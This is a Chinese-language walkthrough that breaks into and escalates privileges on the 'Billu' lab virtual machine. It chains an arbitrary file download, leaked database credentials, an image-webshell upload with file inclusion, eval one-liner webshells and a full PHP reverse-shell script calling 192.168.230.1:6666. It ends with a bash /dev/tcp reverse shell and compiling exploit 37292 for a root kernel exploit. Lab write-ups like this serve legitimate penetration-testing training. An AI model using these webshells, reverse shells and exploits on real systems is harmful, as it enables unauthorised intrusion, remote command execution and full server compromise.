[TOC]



# ==靶机Billu入侵提权实战==

## 一、信息搜集

### 1、基本信息

#### namp 扫描结果

```
IP: 192.168.230.142s
端口: 22 80
系统版本: Linux 3.2 - 4.9
```

#### 御剑目录扫描

![image-20240919152031514](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240919152031514.png)

```
http://192.168.230.142/images/
http://192.168.230.142/add.php
http://192.168.230.142/head.php
http://192.168.230.142/test.php
http://192.168.230.142/index.php
http://192.168.230.142/c.php
http://192.168.230.142/show.php
```

#### dirsearch 目录扫描

![image-20240919152615359](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240919152615359.png)

```
http://192.168.230.142/in
http://192.168.230.142/panel.php
http://192.168.230.142/phpmy/
```

#### Nessus 漏扫

```
Apache/2.2.22 (Ubuntu)
Linux Kernel 3.0 on Ubuntu 12.04
```

## 二、漏洞

### test.php  存在任意文件下载漏洞

![image-20240919154518308](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240919154518308.png)

可尝试将目录里扫描到的文件都下载下来

![image-20240919154821260](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240919154821260.png)

白盒分析每一个文件

### c.php 中泄露数据连接信息

```php
$conn = mysqli_connect("127.0.0.1","billu","b0x_billu","ica_lab");

#其中billu为用户名，b0x_billu为密码
```

### index.php 中存在SQL注入

![image-20240919155513896](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240919155513896.png)

### panel.php 中存在文件包含和文件上传漏洞

panel.php 中还包含了 head2.php 下载下来

## 三、漏洞利用

### 1、根据 c.php 文件中泄露的数据库连接信息登录PHPMyAdmin

在 ica_lab 数据库的 auth 表中找到用户信息

![image-20240919160517124](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240919160517124.png)

利用数据库中的用户信息登录站点  username=biLLu  password=hEx_it

![image-20240919160651703](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240919160651703.png)

### 2、文件上传

![image-20240919160745303](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240919160745303.png)

尝试上传 shell.php 

![image-20240919160817017](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240919160817017.png)

查看 panel.php 文件中的文件上传代码

![image-20240919161010098](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240919161010098.png)

发现即对文件后缀名做校验，也对文件类型做校验

这种情况就上传图片马

![image-20240919161229272](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240919161229272.png)

### 3、文件包含图片马

在 showusers 中可以看到我们上传的图片，通过查看属性可以得知文件位置

![image-20240919161558839](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240919161558839.png)

![image-20240919161908958](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240919161908958.png)

至于 POST 正文数据为何如此构造，请看源码

![image-20240919162007184](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240919162007184.png)

continue 必须有值才可进入判断

load 执行要包含的文件

a 是木马的连接密码

### 4、使用菜刀链接

失败了，原因是什么，为神马，报错如下：

![image-20240919163633406](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240919163633406.png)

在这里，我们shell的连接密码应该是 `continue=continue&load=uploaded_images/gif_shell.gif&a` 可能是因为这个太长了，导致的原因，重新上传并尝试缩短他。将 continue 的值变为 a ， gif_shell.gif 改为 a.gif 

![image-20240919164104320](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240919164104320.png)

`continue=a&load=uploaded_images/a.gif&a=phpinfo();`

成功！但是！

![image-20240919164254543](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240919164254543.png)

**原因是，没有登录，因为 panel 这个页面必须要登录才能使用，所以菜刀，冰蝎都无法使用。那现在该怎么办呢？**

### **先尝试利用包含图片马来写木马**

```php
#POST正文数据如下：
continue=a&load=uploaded_images/a.gif&a=file_put_contents('uploaded_images/shell2.php','<?php @eval($_POST[a]);?>');
```

![image-20240919170517375](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240919170517375.png)

![image-20240919170507613](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240919170507613.png)

写入成功

![image-20240919170646799](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240919170646799.png)

测试也成功

尝试菜刀链接

![image-20240919170736240](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240919170736240.png)

终于成功！

### 5、反弹shell

```php
GIF89a
<?php 
error_reporting (E_ERROR);
ignore_user_abort(true);
ini_set('max_execution_time',0);
$os = substr(PHP_OS,0,3);
$ipaddr = '192.168.230.1';
$port = '6666';
$descriptorspec = array(0 => array("pipe","r"),1 => array("pipe","w"),2 => array("pipe","w"));
$cwd = getcwd();
$msg = php_uname()."\n------------Code by Spider-------------\n";if($os == 'WIN') {    
	$env = array('path' => 'c:\\windows\\system32');
} 
else {    
	$env = array('path' => '/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin');
}
if(function_exists('fsockopen')) {    
	$sock = fsockopen($ipaddr,$port);    
	fwrite($sock,$msg);    
	while ($cmd = fread($sock,1024)) {        
		if (substr($cmd,0,3) == 'cd ') {            
			$cwd = trim(substr($cmd,3,-1));            
			chdir($cwd);            
			$cwd = getcwd();        
			}        
		if (trim(strtolower($cmd)) == 'exit') {            
			break;        
		} 
        else {            
			$process = proc_open($cmd,$descriptorspec,$pipes,$cwd,$env);            
				if (is_resource($process)) {                
					fwrite($pipes[0],$cmd);                
					fclose($pipes[0]);                
					$msg = stream_get_contents($pipes[1]);                
					fwrite($sock,$msg);                
					fclose($pipes[1]);                
					$msg = stream_get_contents($pipes[2]);                
					fwrite($sock,$msg);                
					fclose($pipes[2]);                
					proc_close($process);            
				}        
			}    
		}    
		fclose($sock);
	} 
	else {    
		$sock = socket_create(AF_INET,SOCK_STREAM,SOL_TCP);    
		socket_connect($sock,$ipaddr,$port);    
		socket_write($sock,$msg);    
		fwrite($sock,$msg);    
         while ($cmd = socket_read($sock,1024)) {        
             if (substr($cmd,0,3) == 'cd ') {            
                 $cwd = trim(substr($cmd,3,-1));            
                 chdir($cwd);            
                 $cwd = getcwd();        
             }        
             if (trim(strtolower($cmd)) == 'exit') {            
                 break;        
             } 
             else {            
                 $process = proc_open($cmd,$descriptorspec,$pipes,$cwd,$env);            
                 if (is_resource($process)) {                
                     fwrite($pipes[0],$cmd);                
                     fclose($pipes[0]);                
                     $msg = stream_get_contents($pipes[1]);                
                     socket_write($sock,$msg,strlen($msg));                
                     fclose($pipes[1]);                
                     $msg = stream_get_contents($pipes[2]);                
                     socket_write($sock,$msg,strlen($msg));                
                     fclose($pipes[2]);                
                     proc_close($process);            
                 }        
             }    
         }    
        socket_close($sock);
    }
?>
```

将上述代码存放于 `reverse_conn.gif` 中并上传

![image-20240919164631609](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240919164631609.png)

攻击机开启监听

![image-20240919164711100](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240919164711100.png)

文件包含

![image-20240919164835001](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240919164835001.png)

写木马到 uploades_images 目录下

```shell
cd ./uploaded_images
echo "<?php @eval($_POST[a]);?>" > shell.php
```

![image-20240919165420301](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240919165420301.png)

## 四、系统提权

既上面拿到 Billu 的 shell 之后，现在就要开始提权，至于如何提权呢，请看接下来的操作

反弹得到的 shell 才是真正的 shell，像菜刀中的虚拟终端毕竟只是虚拟终端

### 环境检查

```
gcc -v
```

![image-20240920094128835](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240920094128835.png)

```
php -v
```

![image-20240920094150362](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240920094150362.png)

```
python --version
```

![image-20240920094602512](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240920094602512.png)

```
perl -v
```

![image-20240920094945904](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240920094945904.png)

```
nc -v
```

![image-20240920103930864](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240920103930864.png)

### 内核版本漏洞的利用

```
searchsploit Linux Kernel 3.0 on Ubuntu 12.04
```

![image-20240920100211580](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240920100211580.png)

第一个是 c 源代码，第二个是 txt 说明性文件

#### 反弹shell

先用上面反弹得到的shell尝试，这个是利用文件包含，包含图片马，该图片马其实就是反弹shell的php代码

或者直接上传一个 reverse_conn.php 然后访问 `http://192.168.230.142/uploaded_images/reverse_conn.php`

![image-20240920100616842](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240920100616842.png)

#### 上传漏洞源代码并进行编译和执行

先使用 xshell 下载 37292.c 源代码到本地，然后在从本地通过菜刀上传到目标服务器

```
searchsploit -p 37292

```

![image-20240920101014221](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240920101014221.png)

![image-20240920101245001](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240920101245001.png)

下载到本地，然后利用菜刀上传到目标服务器

![image-20240920101807935](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240920101807935.png)

```
cd /var/tmp
gcc 37292.c -o ofs
```

报错

![image-20240920102109732](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240920102109732.png)

重新更换一个反弹shell

```php
<?php
    system("bash -c 'bash -i >& /dev/tcp/192.168.230.1/6666 0>&1'");
?>
```

上传到目标服务器，执行

```
gcc 37292.c -o ofs
./ofs
```

![image-20240920102836014](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240920102836014.png)

![image-20240920102947211](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240920102947211.png)

**成功，所以在一定情况下，尤其是提权的时候，一定需要注意，第一，不能乱使用提权漏洞，因为很容易将目标服务器整崩溃**

> 为神马在这里我没有使用脏牛漏洞，因为经过测试，在这里脏牛漏洞两个都会直接将服务器搞崩，所以我没有演示

**其次，如果有时候这个shell失败了，可以尝试换一个shell，因为很有可能是shell的问题导致编译失败等等**

**最好的反弹就是原生的输入输出，即依靠 `bash -i >& /dev/tcp/192.168.230.1/6666 0>&1`**

